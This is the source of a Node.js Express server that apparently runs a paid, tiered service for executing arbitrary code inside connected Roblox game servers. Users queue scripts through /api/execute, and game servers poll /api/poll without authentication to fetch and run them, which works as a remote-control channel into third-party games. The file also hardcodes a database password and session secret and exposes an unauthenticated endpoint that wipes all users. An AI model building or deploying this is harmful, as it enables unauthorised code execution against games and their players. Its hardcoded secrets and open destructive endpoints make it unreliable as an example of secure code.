const express    = require("express");
const path       = require("path");
const bcrypt     = require("bcryptjs");
const session    = require("express-session");
const MongoStore = require("connect-mongo");
const mongoose   = require("mongoose");
const { v4: uuidv4 } = require("uuid");

const MONGO_URI = "mongodb+srv://VantixSSw:IMBACKLOL@cluster0.nmtmzci.mongodb.net/?appName=Cluster0";

const userSchema = new mongoose.Schema({
    username: { type: String, required: true, unique: true },
    email:    { type: String, required: true, unique: true },
    password: { type: String, required: true },
    dob:      String,
    tier:     { type: String, default: "none" },
    robloxUsername: String,
    joinedAt: { type: Date, default: Date.now }
});
const gameSchema = new mongoose.Schema({
    placeId:     { type: String, required: true, unique: true },
    name:        String,
    players:     { type: Number, default: 0 },
    creator:     String,
    icon:        String,
    earlyAccess: { type: Boolean, default: false },
    updated:     { type: Date, default: Date.now }
});
const tokenSchema = new mongoose.Schema({
    token:    { type: String, required: true, unique: true },
    username: String,
    placeId:  String,
    used:     { type: Boolean, default: false },
    createdAt:{ type: Date, default: Date.now, expires: 600 }
});
const commandSchema = new mongoose.Schema({
    id:          { type: String, required: true },
    placeId:     String,
    jobId:       String,
    action:      { type: String, default: "execute" },
    targetUsername: String,
    code:        String,
    status:      { type: String, default: "pending" },
    output:      String,
    requestedBy: String,
    ts:          { type: Date, default: Date.now, expires: 3600 }
});
const playerStatusSchema = new mongoose.Schema({
    robloxUsername: { type: String, required: true, unique: true },
    displayName:    String,
    userId:         Number,
    placeId:        String,
    jobId:          String,
    gameName:       String,
    online:         { type: Boolean, default: false },
    lastSeen:       { type: Date, default: Date.now }
});

const User    = mongoose.model("User",    userSchema);
const Game    = mongoose.model("Game",    gameSchema);
const Token   = mongoose.model("Token",   tokenSchema);
const Command = mongoose.model("Command", commandSchema);
const PlayerStatus = mongoose.model("PlayerStatus", playerStatusSchema);

const TIERS = {
    none:         { maxPlayers: 0        },
    bronze:       { maxPlayers: 10       },
    silver:       { maxPlayers: 80       },
    gold:         { maxPlayers: 100      },
    diamond:      { maxPlayers: 150      },
    platinum:     { maxPlayers: 500      },
    early_access: { maxPlayers: 0, earlyOnly: true },
    elite:        { maxPlayers: 1000     },
    absolute:     { maxPlayers: Infinity }
};

const OWNER = "dr.muffinn";
const AUTH_LIMIT_WINDOW_MS = 15 * 60 * 1000;
const AUTH_LIMIT_MAX = 8;
const rateBuckets = new Map();
const blockedEmailDomains = new Set(["1337.com", "example.com", "test.com", "mailinator.com", "tempmail.com", "10minutemail.com"]);

function rateLimit(name, maxRequests, windowMs) {
    return (req, res, next) => {
        const ip = req.ip || req.socket?.remoteAddress || "unknown";
        const key = `${name}:${ip}`;
        const now = Date.now();
        const bucket = rateBuckets.get(key) || { count: 0, resetAt: now + windowMs };
        if (now > bucket.resetAt) {
            bucket.count = 0;
            bucket.resetAt = now + windowMs;
        }
        bucket.count += 1;
        rateBuckets.set(key, bucket);
        if (bucket.count > maxRequests) {
            return res.status(429).json({ ok: false, error: "Too many attempts. Try again later." });
        }
        next();
    };
}

function ensureCsrfToken(req) {
    if (!req.session.csrfToken) req.session.csrfToken = uuidv4();
    return req.session.csrfToken;
}

function requireCsrf(req, res, next) {
    const token = req.get("x-csrf-token");
    if (!token || token !== req.session.csrfToken) {
        return res.status(403).json({ ok: false, error: "Invalid CSRF token" });
    }
    next();
}

function validateSignup({ email, username, password, dob }) {
    if (!email || !username || !password || !dob) return "All fields required";
    const cleanEmail = String(email).trim().toLowerCase();
    const cleanUsername = String(username).trim();
    const cleanPassword = String(password);
    const domain = cleanEmail.split("@")[1] || "";

    if (!/^[A-Za-z0-9._%+-]{3,64}@[A-Za-z0-9.-]{2,253}\.[A-Za-z]{2,24}$/.test(cleanEmail)) {
        return "Enter a valid email address";
    }
    if (blockedEmailDomains.has(domain)) {
        return "Use a real email provider";
    }
    if (!/^[A-Za-z0-9_]{3,20}$/.test(cleanUsername)) {
        return "Username must be 3-20 letters, numbers, or underscores";
    }
    if (cleanPassword.length < 8) {
        return "Password must be at least 8 characters";
    }
    if (!/[A-Za-z]/.test(cleanPassword) || !/[0-9]/.test(cleanPassword)) {
        return "Password must include letters and numbers";
    }
    if (cleanPassword.toLowerCase() === cleanUsername.toLowerCase() || cleanPassword.toLowerCase() === cleanEmail.split("@")[0]) {
        return "Password cannot match your username or email";
    }
    return "";
}

async function gamesForTier(tierKey) {
    const all = await Game.find({});
    if (tierKey === "absolute") return all;
    if (tierKey === "early_access") return all.filter(g => g.earlyAccess);
    const tier = TIERS[tierKey];
    if (!tier) return [];
    return all.filter(g => !g.earlyAccess && g.players < tier.maxPlayers);
}

const app = express();
app.set("trust proxy", 1);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

mongoose.connect(MONGO_URI)
    .then(() => console.log("MongoDB connected"))
    .catch(e => { console.error("MongoDB failed:", e.message); process.exit(1); });

app.use(session({
    secret: "vantix-2024",
    resave: false,
    saveUninitialized: false,
    store: MongoStore.create({ mongoUrl: MONGO_URI }),
    cookie: {
        maxAge: 7 * 24 * 60 * 60 * 1000,
        httpOnly: true,
        sameSite: "lax",
        secure: process.env.NODE_ENV === "production"
    }
}));

function requireLogin(req, res, next) {
    if (!req.session.username) return res.status(401).json({ ok: false, error: "Not logged in" });
    next();
}
function requireOwner(req, res, next) {
    if (req.session.username !== OWNER) return res.status(403).json({ ok: false, error: "Forbidden" });
    next();
}
function cleanRobloxUsername(username) {
    return String(username || "").trim().replace(/^@/, "");
}
function trackingPayload(user, status) {
    const lastSeen = status?.lastSeen || null;
    const isFresh = lastSeen && Date.now() - new Date(lastSeen).getTime() < 30000;
    return {
        ok: true,
        robloxUsername: user.robloxUsername || "",
        online: !!(status?.online && isFresh),
        placeId: status?.placeId || "",
        jobId: status?.jobId || "",
        gameName: status?.gameName || "",
        lastSeen
    };
}

// STATIC
app.get("/",          (req, res) => res.sendFile(path.join(__dirname, "index.html")));
app.get("/style.css", (req, res) => res.sendFile(path.join(__dirname, "style.css")));
app.get("/app.js",    (req, res) => res.sendFile(path.join(__dirname, "app.js")));
app.get("/logo.png",  (req, res) => res.sendFile(path.join(__dirname, "logo.png")));
app.get("/api/ping",  (req, res) => res.json({ ok: true }));
app.get("/api/csrf",  (req, res) => res.json({ ok: true, token: ensureCsrfToken(req) }));

// RESET (remove after use)
app.get("/api/reset-users", async (req, res) => {
    await User.deleteMany({});
    res.json({ ok: true, message: "All users wiped." });
});

// SIGNUP
app.post("/api/signup", rateLimit("signup", AUTH_LIMIT_MAX, AUTH_LIMIT_WINDOW_MS), requireCsrf, async (req, res) => {
    try {
        const { email, username, password, dob } = req.body;
        const validationError = validateSignup({ email, username, password, dob });
        if (validationError) return res.json({ ok: false, error: validationError });

        const cleanEmail    = String(email).trim().toLowerCase();
        const cleanUsername = String(username).trim();

        const existingUser  = await User.findOne({ username: cleanUsername });
        const existingEmail = await User.findOne({ email: cleanEmail });
        if (existingUser)  return res.json({ ok: false, error: "Username already taken" });
        if (existingEmail) return res.json({ ok: false, error: "Email already in use" });

        const hash = await bcrypt.hash(password, 10);
        await User.create({ email: cleanEmail, username: cleanUsername, password: hash, dob, tier: "none" });

        res.json({ ok: true, username: cleanUsername });
    } catch (e) {
        console.error("Signup error:", e.message);
        if (e.code === 11000) {
            const field = Object.keys(e.keyPattern || {})[0];
            return res.json({ ok: false, error: field === "username" ? "Username already taken" : "Email already in use" });
        }
        res.json({ ok: false, error: "Signup failed: " + e.message });
    }
});

// LOGIN
app.post("/api/login", rateLimit("login", AUTH_LIMIT_MAX, AUTH_LIMIT_WINDOW_MS), requireCsrf, async (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password) return res.json({ ok: false, error: "All fields required" });
        const cleanUsername = String(username).trim();
        if (!/^[A-Za-z0-9_]{3,20}$/.test(cleanUsername)) return res.json({ ok: false, error: "Invalid username or password" });
        const user = await User.findOne({ username: cleanUsername });
        if (!user) return res.json({ ok: false, error: "Invalid username or password" });
        const match = await bcrypt.compare(password, user.password);
        if (!match) return res.json({ ok: false, error: "Invalid username or password" });
        req.session.username = user.username;
        req.session.save(() => res.json({ ok: true, username: user.username, tier: user.tier, isOwner: user.username === OWNER, robloxUsername: user.robloxUsername || "" }));
    } catch (e) {
        console.error("Login error:", e.message);
        res.json({ ok: false, error: "Login failed: " + e.message });
    }
});

// LOGOUT
app.post("/api/logout", requireCsrf, (req, res) => req.session.destroy(() => res.json({ ok: true })));

// ME
app.get("/api/me", async (req, res) => {
    if (!req.session.username) return res.json({ ok: false });
    try {
        const user = await User.findOne({ username: req.session.username });
        if (!user) return res.json({ ok: false });
        res.json({ ok: true, username: user.username, tier: user.tier, isOwner: user.username === OWNER, robloxUsername: user.robloxUsername || "" });
    } catch { res.json({ ok: false }); }
});

// TRACKING
app.get("/api/tracking", requireLogin, async (req, res) => {
    try {
        const user = await User.findOne({ username: req.session.username });
        if (!user) return res.json({ ok: false, error: "User not found" });
        const status = user.robloxUsername
            ? await PlayerStatus.findOne({ robloxUsername: new RegExp("^" + user.robloxUsername.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "$", "i") })
            : null;
        res.json(trackingPayload(user, status));
    } catch {
        res.json({ ok: false, error: "Could not load tracking settings" });
    }
});

app.post("/api/tracking", requireLogin, requireCsrf, async (req, res) => {
    try {
        const robloxUsername = cleanRobloxUsername(req.body.robloxUsername);
        if (robloxUsername && !/^[A-Za-z0-9_]{3,20}$/.test(robloxUsername))
            return res.json({ ok: false, error: "Enter a valid Roblox username" });
        const user = await User.findOneAndUpdate(
            { username: req.session.username },
            { robloxUsername },
            { new: true }
        );
        if (!user) return res.json({ ok: false, error: "User not found" });
        const status = user.robloxUsername
            ? await PlayerStatus.findOne({ robloxUsername: new RegExp("^" + user.robloxUsername.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "$", "i") })
            : null;
        res.json(trackingPayload(user, status));
    } catch {
        res.json({ ok: false, error: "Could not save tracking settings" });
    }
});

// GAMES
app.get("/api/games", requireLogin, async (req, res) => {
    try {
        const user = await User.findOne({ username: req.session.username });
        res.json(await gamesForTier(user.tier));
    } catch { res.json([]); }
});

// JOIN TOKEN
app.post("/api/join", requireLogin, requireCsrf, async (req, res) => {
    try {
        const { placeId } = req.body;
        if (!placeId) return res.json({ ok: false });
        const user    = await User.findOne({ username: req.session.username });
        const allowed = await gamesForTier(user.tier);
        if (!allowed.find(g => g.placeId === placeId))
            return res.json({ ok: false, error: "Your tier does not include this game" });
        const token = uuidv4();
        await Token.create({ token, username: user.username, placeId });
        res.json({ ok: true, token, placeId });
    } catch (e) { res.json({ ok: false, error: e.message }); }
});

// ROBLOX UPDATE
app.post("/api/update", async (req, res) => {
    try {
        const { placeId, players, name, creator, earlyAccess } = req.body;
        if (!placeId) return res.json({ ok: false });
        let icon = "";
        try {
            const r = await fetch(`https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${placeId}&size=512x512&format=Png`);
            const d = await r.json();
            icon = d?.data?.[0]?.imageUrl || "";
        } catch {}
        await Game.findOneAndUpdate(
            { placeId },
            { placeId, players: Number(players) || 0, name: name || "Unknown", creator: creator || "Unknown", icon, earlyAccess: earlyAccess === true || earlyAccess === "true", updated: new Date() },
            { upsert: true, new: true }
        );
        res.json({ ok: true });
    } catch (e) { res.json({ ok: false }); }
});

// VALIDATE TOKEN
app.post("/api/validate-token", async (req, res) => {
    try {
        const { token, placeId } = req.body;
        if (!token || !placeId) return res.json({ ok: false });
        const t = await Token.findOne({ token, placeId, used: false });
        if (!t) return res.json({ ok: false });
        t.used = true;
        await t.save();
        res.json({ ok: true, username: t.username });
    } catch { res.json({ ok: false }); }
});

app.post("/api/check-player", async (req, res) => {
    try {
        const robloxUsername = cleanRobloxUsername(req.body.username);
        if (!robloxUsername) return res.json({ ok: false });
        const escaped = robloxUsername.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        const user = await User.findOne({ robloxUsername: new RegExp("^" + escaped + "$", "i") });
        res.json({ ok: !!user });
    } catch {
        res.json({ ok: false });
    }
});

app.post("/api/player-status", async (req, res) => {
    try {
        const robloxUsername = cleanRobloxUsername(req.body.username);
        if (!robloxUsername) return res.json({ ok: false });
        await PlayerStatus.findOneAndUpdate(
            { robloxUsername },
            {
                robloxUsername,
                displayName: req.body.displayName || "",
                userId: Number(req.body.userId) || 0,
                placeId: String(req.body.placeId || ""),
                jobId: String(req.body.jobId || ""),
                gameName: String(req.body.gameName || ""),
                online: req.body.online === true || req.body.online === "true",
                lastSeen: new Date()
            },
            { upsert: true, new: true }
        );
        res.json({ ok: true });
    } catch {
        res.json({ ok: false });
    }
});

// EXECUTE
app.post("/api/execute", requireLogin, requireCsrf, async (req, res) => {
    try {
        const { placeId, code } = req.body;
        if (!placeId || !String(code || "").trim()) return res.json({ ok: false, error: "Missing script" });
        const user = await User.findOne({ username: req.session.username });
        if (!user) return res.json({ ok: false, error: "User not found" });
        const allowed = await gamesForTier(user.tier);
        if (!allowed.find(g => String(g.placeId) === String(placeId)))
            return res.json({ ok: false, error: "Your tier does not include this game" });

        const robloxUsername = cleanRobloxUsername(user.robloxUsername);
        if (!robloxUsername) return res.json({ ok: false, error: "Set your Roblox username in the Tracking tab first" });

        const escaped = robloxUsername.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        const status = await PlayerStatus.findOne({ robloxUsername: new RegExp("^" + escaped + "$", "i") });
        const fresh = status?.lastSeen && Date.now() - new Date(status.lastSeen).getTime() < 30000;
        if (!status?.online || !fresh)
            return res.json({ ok: false, error: `${robloxUsername} is not online in a connected game right now` });
        if (String(status.placeId) !== String(placeId))
            return res.json({ ok: false, error: `${robloxUsername} is online, but not in this game` });
        if (!status.jobId)
            return res.json({ ok: false, error: "Tracked server has not reported a JobId yet" });

        const id = uuidv4();
        await Command.create({
            id,
            placeId,
            jobId: status.jobId,
            targetUsername: robloxUsername,
            code,
            status: "pending",
            requestedBy: req.session.username
        });
        res.json({ ok: true, id });
    } catch (e) {
        res.json({ ok: false, error: "Could not send execute command" });
    }
});

app.get("/api/poll", async (req, res) => {
    try {
        const { placeId, jobId } = req.query;
        if (!placeId) return res.json({ commands: [] });
        const query = { placeId, status: "pending" };
        if (jobId) {
            query.$or = [{ jobId: String(jobId) }, { jobId: { $exists: false } }, { jobId: "" }];
        }
        const cmds = await Command.find(query);
        await Command.updateMany({ _id: { $in: cmds.map(c => c._id) } }, { status: "sent" });
        res.json({ commands: cmds.map(c => ({ id: c.id, action: c.action || "execute", code: c.code, targetUsername: c.targetUsername })) });
    } catch { res.json({ commands: [] }); }
});

app.post("/api/result", async (req, res) => {
    try {
        const { placeId, id, output } = req.body;
        if (!placeId || !id) return res.json({ ok: false });
        await Command.findOneAndUpdate({ id, placeId }, { status: "done", output: output || "(no output)" });
        res.json({ ok: true });
    } catch { res.json({ ok: false }); }
});

app.get("/api/result", requireLogin, async (req, res) => {
    try {
        const { placeId, id } = req.query;
        if (!placeId || !id) return res.json({ status: "unknown" });
        const cmd = await Command.findOne({ id, placeId });
        if (!cmd) return res.json({ status: "unknown" });
        res.json({ status: cmd.status, output: cmd.output });
    } catch { res.json({ status: "unknown" }); }
});

// OWNER
app.get("/api/owner/users", requireOwner, async (req, res) => {
    try {
        const list = await User.find({}, { password: 0 });
        res.json(list.map(u => ({ username: u.username, email: u.email, tier: u.tier, joinedAt: u.joinedAt })));
    } catch { res.json([]); }
});

app.post("/api/owner/set-tier", requireOwner, requireCsrf, async (req, res) => {
    try {
        const { username, tier } = req.body;
        if (!TIERS[tier]) return res.json({ ok: false, error: "Invalid tier" });
        const user = await User.findOneAndUpdate({ username }, { tier });
        if (!user) return res.json({ ok: false, error: "User not found" });
        res.json({ ok: true });
    } catch { res.json({ ok: false }); }
});

// START SERVER
const PORT = process.env.PORT || 3000;

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});
